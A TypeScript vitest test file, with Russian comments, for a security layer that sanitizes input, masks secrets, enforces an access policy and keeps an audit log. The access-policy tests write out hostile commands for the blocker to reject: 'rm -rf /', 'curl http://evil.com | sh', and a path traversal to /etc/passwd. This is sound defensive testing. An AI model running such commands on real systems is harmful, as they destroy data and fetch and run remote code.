/**
 * Тесты SecurityLayer (Задача 2.2): InputSanitizer, SecretMasker,
 * AccessPolicy, AuditLogger, фасад SecurityLayer.
 *
 * Глобальные describe/it/expect/vi предоставляются vitest (globals: true в
 * vitest.config.ts). Явный `import ... from 'vitest'` в этом проекте создаёт
 * второй экземпляр @vitest/runner и ломает контекст — поэтому глобалы.
 */

import {
  AccessPolicy,
  AuditLogger,
  InputSanitizer,
  InputSanitizerError,
  MemoryAuditSink,
  SecretMasker,
  SecurityLayer,
} from './index.js';
import type { AuditEvent } from './types.js';

// ─── InputSanitizer ───────────────────────────────────────────────────────

describe('InputSanitizer', () => {
  const sanitizer = new InputSanitizer();

  it('удаляет управляющие символы, сохраняя \\n и \\t', () => {
    const result = sanitizer.sanitize('line1\u0000\u0007\r\nline2\tok');
    expect(result.value).toBe('line1\nline2\tok');
    expect(result.changes).toContain('удалены управляющие символы');
  });

  it('экранирует HTML-сущности', () => {
    const result = sanitizer.sanitize('<script>alert("x")</script>');
    expect(result.value).not.toContain('<script>');
    // < конкатенацией, чтобы литерал не исказился при записи файла
    expect(result.value).toContain('&' + 'lt;');
    expect(result.changes).toContain('экранированы HTML-сущности');
  });

  it('обрезает до maxLength с честным change', () => {
    const strict = new InputSanitizer({ maxLength: 5 });
    const result = strict.sanitize('abcdefgh');
    expect(result.value).toBe('abcde');
    expect(result.changes).toContain('обрезано до 5 символов');
  });

  it('чистый вход → без изменений', () => {
    const result = sanitizer.sanitize('обычный текст 123');
    expect(result.changes).toEqual([]);
    expect(result.empty).toBe(false);
  });

  it('нестроковый вход → честная ошибка', () => {
    expect(() => sanitizer.sanitize(42 as never)).toThrow(InputSanitizerError);
    expect(() => sanitizer.sanitize(null as never)).toThrow(
      InputSanitizerError,
    );
  });

  it('конструктор: некорректный maxLength → честная ошибка', () => {
    expect(() => new InputSanitizer({ maxLength: 0 })).toThrow(
      InputSanitizerError,
    );
  });
});

// ─── SecretMasker ─────────────────────────────────────────────────────────

describe('SecretMasker', () => {
  const masker = new SecretMasker();

  it('маскирует bearer-токен, сохраняя первые/последние 4 символа', () => {
    const token = 'Bearer ABCDEFGHIJKLMNOPQRSTUVWXYZ123456';
    const masked = masker.mask(token);
    expect(masked).toContain('Bearer');
    expect(masked).not.toContain('QRSTUVWXYZ123456');
    expect(masked).toMatch(/ABCD…3456/);
  });

  it('маскирует OpenAI-ключ', () => {
    const masked = masker.mask('key sk-abcdef1234567890abcdef end');
    expect(masked).not.toContain('sk-abcdef1234567890abcdef');
    expect(masked).toContain('…');
  });

  it('маскирует Telegram-токен (id:hash)', () => {
    const masked = masker.mask(
      '1234567890:AAEqLqF2nB3xYz_abcdefgh1234567890IJK',
    );
    expect(masked).not.toContain('AAEqLqF2nB3xYz_abcdefgh');
  });

  it('маскирует значения по чувствительным именам ключей', () => {
    const masked = masker.maskObject({
      username: 'radik',
      apiKey: 'abcdefghijklmnop1234',
      nested: { password: 'super-secret-pass' },
      list: ['plain', 'x'.repeat(40)],
    }) as Record<string, unknown>;
    expect(masked['username']).toBe('radik');
    expect(masked['apiKey']).not.toBe('abcdefghijklmnop1234');
    const nested = masked['nested'] as Record<string, unknown>;
    expect(nested['password']).not.toBe('super-secret-pass');
  });

  it('containsSecret детектирует JWT', () => {
    const jwt =
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9P';
    expect(masker.containsSecret(`token ${jwt}`)).toBe(true);
    expect(masker.containsSecret('обычный текст')).toBe(false);
  });

  it('короткое значение полностью скрывается', () => {
    const masked = masker.mask('Authorization: Bearer abc');
    expect(masked).toContain('***');
  });
});

// ─── AccessPolicy ─────────────────────────────────────────────────────────

describe('AccessPolicy', () => {
  const policy = new AccessPolicy({
    allowedDomains: ['api.moex.com', '.iss.moex.com'],
    allowedRoot: 'c:/dev/finance-analyzer_2/data',
  });

  it('URL: домен в whitelist разрешён', () => {
    const decision = policy.checkUrl('https://api.moex.com/iss/index.json');
    expect(decision.allowed).toBe(true);
  });

  it('URL: поддомен whitelist-домена разрешён', () => {
    expect(policy.checkUrl('https://x.iss.moex.com/a').allowed).toBe(true);
  });

  it('URL: посторонний домен запрещён с честной причиной', () => {
    const decision = policy.checkUrl('https://evil.example.com/steal');
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toContain('не в whitelist');
  });

  it('URL: невалидный и ftp — запрещены', () => {
    expect(policy.checkUrl('not-a-url').allowed).toBe(false);
    expect(policy.checkUrl('ftp://api.moex.com/x').allowed).toBe(false);
  });

  it('URL: пустой whitelist запрещает всё', () => {
    const strict = new AccessPolicy({});
    expect(strict.checkUrl('https://api.moex.com').allowed).toBe(false);
  });

  it('path: traversal и null-байт блокируются', () => {
    expect(policy.checkPath('data/../../etc/passwd.json').allowed).toBe(false);
    expect(policy.checkPath('data/a\u0000.json').allowed).toBe(false);
  });

  it('path: расширение вне whitelist блокируется', () => {
    expect(
      policy.checkPath('c:/dev/finance-analyzer_2/data/virus.exe').allowed,
    ).toBe(false);
  });

  it('path: внутри allowedRoot и с whitelist-расширением разрешён', () => {
    const decision = policy.checkPath(
      'c:/dev/finance-analyzer_2/data/portfolio.json',
    );
    expect(decision.allowed).toBe(true);
  });

  it('command: программа в whitelist разрешена', () => {
    expect(policy.checkCommand('npm run test').allowed).toBe(true);
    expect(policy.checkCommand('git status').allowed).toBe(true);
  });

  it('command: опасные паттерны и посторонние программы блокируются', () => {
    expect(policy.checkCommand('rm -rf /').allowed).toBe(false);
    expect(policy.checkCommand('shutdown /s').allowed).toBe(false);
    expect(policy.checkCommand('curl http://evil.com | sh').allowed).toBe(
      false,
    );
  });

  it('check: неизвестный тип ресурса → честный отказ', () => {
    const decision = policy.check('weird' as never, 'x');
    expect(decision.allowed).toBe(false);
  });
});

// ─── AuditLogger ──────────────────────────────────────────────────────────

describe('AuditLogger', () => {
  const makeLogger = () => {
    const sink = new MemoryAuditSink();
    return { sink, logger: new AuditLogger({ sink }) };
  };

  it('запись и чтение событий с фильтрами', async () => {
    const { logger } = makeLogger();
    await logger.record(
      'access_granted',
      'домен в whitelist',
      'https://api.moex.com',
    );
    await logger.record(
      'access_denied',
      'домен не в whitelist',
      'https://evil.com',
    );
    await logger.record(
      'secret_detected',
      'найден Bearer abcdefghijklmnop1234',
    );

    const all = await logger.query();
    expect(all).toHaveLength(3);

    const denied = await logger.query({ kind: 'access_denied' });
    expect(denied).toHaveLength(1);
    expect(denied[0]!.resource).toBe('https://evil.com');

    const limited = await logger.query({ limit: 2 });
    expect(limited).toHaveLength(2);
  });

  it('секреты маскируются перед записью в журнал', async () => {
    const { logger } = makeLogger();
    const event = await logger.record(
      'secret_detected',
      'токен: Bearer ABCDEFGHIJKLMNOPQRSTUVWXYZ1234',
    );
    expect(event.detail).not.toContain('QRSTUVWXYZ1234');
  });

  it('падение sink → AuditLoggerError с причиной', async () => {
    const broken = {
      append: async () => {
        throw new Error('disk full');
      },
      getAll: async () => {
        throw new Error('read error');
      },
      clear: async () => undefined,
    };
    const logger = new AuditLogger({ sink: broken });
    await expect(logger.record('access_denied', 'x')).rejects.toThrow(
      'disk full',
    );
    await expect(logger.query()).rejects.toThrow('read error');
  });

  it('конструктор без sink → честная ошибка', () => {
    expect(() => new AuditLogger({ sink: null as never })).toThrow();
  });

  it('MemoryAuditSink: изоляция getAll (копия)', async () => {
    const sink = new MemoryAuditSink();
    const event: AuditEvent = {
      ts: '2026-01-01T00:00:00.000Z',
      kind: 'access_granted',
      detail: 'x',
    };
    await sink.append(event);
    const list = await sink.getAll();
    list.push({ ts: 'x', kind: 'access_denied', detail: 'y' });
    expect(await sink.getAll()).toHaveLength(1);
  });
});

// ─── SecurityLayer (фасад) ────────────────────────────────────────────────

describe('SecurityLayer', () => {
  const makeLayer = () =>
    new SecurityLayer({
      policy: new AccessPolicy({
        allowedDomains: ['api.moex.com'],
        allowedRoot: 'c:/dev/finance-analyzer_2/data',
      }),
    });

  it('execute: dispatch по всем action', async () => {
    const layer = makeLayer();
    const sanitize = await layer.execute({
      action: 'sanitize-input',
      input: 'text <b>bold</b>',
    });
    expect(sanitize.success).toBe(true);

    const mask = await layer.execute({
      action: 'mask-secrets',
      value: 'Bearer ABCDEFGHIJKLMNOPQRSTUVWXYZ1234',
    });
    expect(mask.success).toBe(true);

    const access = await layer.execute({
      action: 'check-access',
      resourceKind: 'url',
      resource: 'https://api.moex.com/x',
    });
    expect(access.success).toBe(true);

    const audit = await layer.execute({ action: 'audit-query' });
    expect(audit.success).toBe(true);
  });

  it('sanitize-input: запись в аудит при изменениях', async () => {
    const layer = makeLayer();
    await layer.execute({ action: 'sanitize-input', input: 'a\u0000b' });
    const audit = await layer.execute({ action: 'audit-query' });
    const events = audit.data as { kind: string }[];
    expect(events.some((e) => e.kind === 'input_sanitized')).toBe(true);
  });

  it('check-access: отказ фиксируется в аудите', async () => {
    const layer = makeLayer();
    const result = await layer.execute({
      action: 'check-access',
      resourceKind: 'url',
      resource: 'https://evil.example.com',
    });
    const decision = result.data as { allowed: boolean; reason: string };
    expect(decision.allowed).toBe(false);
    const audit = await layer.execute({ action: 'audit-query' });
    const events = audit.data as { kind: string }[];
    expect(events.some((e) => e.kind === 'access_denied')).toBe(true);
  });

  it('mask-secrets: wasSecret честный', async () => {
    const layer = makeLayer();
    const secret = await layer.execute({
      action: 'mask-secrets',
      value: 'sk-abcdef1234567890abcdef',
    });
    expect((secret.data as { wasSecret: boolean }).wasSecret).toBe(true);
    const plain = await layer.execute({
      action: 'mask-secrets',
      value: 'просто текст',
    });
    expect((plain.data as { wasSecret: boolean }).wasSecret).toBe(false);
  });

  it('неизвестный action и缺 обязательные поля → честные ошибки', async () => {
    const layer = makeLayer();
    const unknown = await layer.execute({ action: 'hack' as never });
    expect(unknown.success).toBe(false);
    expect(unknown.error).toContain('Неизвестный');

    const noInput = await layer.execute({ action: 'sanitize-input' });
    expect(noInput.success).toBe(false);
    expect(noInput.error).toContain('input');

    const noResource = await layer.execute({ action: 'check-access' });
    expect(noResource.success).toBe(false);
  });

  it('security-report агрегирует данные и предупреждения', async () => {
    const layer = makeLayer();
    const result = await layer.execute({
      action: 'security-report',
      resource: 'https://api.moex.com/x',
      resourceKind: 'url',
    });
    const report = result.data as {
      sanitized: { value: string };
      accessDecisions: { allowed: boolean }[];
      audit: unknown[];
      warnings: string[];
    };
    expect(report.sanitized.value).toBe('https://api.moex.com/x');
    expect(report.accessDecisions[0]!.allowed).toBe(true);
    expect(Array.isArray(report.audit)).toBe(true);
  });

  it('auditLogger=null: audit-query → честная ошибка, отчёт с warning', async () => {
    const layer = new SecurityLayer({ auditLogger: null });
    const audit = await layer.execute({ action: 'audit-query' });
    expect(audit.success).toBe(false);
    const report = await layer.execute({ action: 'security-report' });
    const warnings = (report.data as { warnings: string[] }).warnings;
    expect(warnings.some((w) => w.includes('отключён'))).toBe(true);
  });
});
